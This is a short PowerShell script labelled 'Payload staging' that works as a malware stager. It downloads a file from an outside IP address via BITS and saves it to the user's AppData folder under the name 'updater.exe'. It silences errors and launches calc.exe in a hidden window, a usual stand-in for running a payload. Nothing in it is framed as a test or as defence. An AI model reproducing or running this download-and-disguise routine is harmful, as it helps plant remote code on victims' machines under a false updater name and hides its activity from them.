<# Payload staging #>
[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://203.0.113.138/stage1.ps1',
    [string]$WorkingPath = "$env:APPDATA\updater.exe",
    [int]$TimeoutSec = 230
)
Start-BitsTransfer -Source $Stage2Url -Destination $WorkingPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
Set-Location -Path $env:TEMP
$StageMarker = "stage-23"
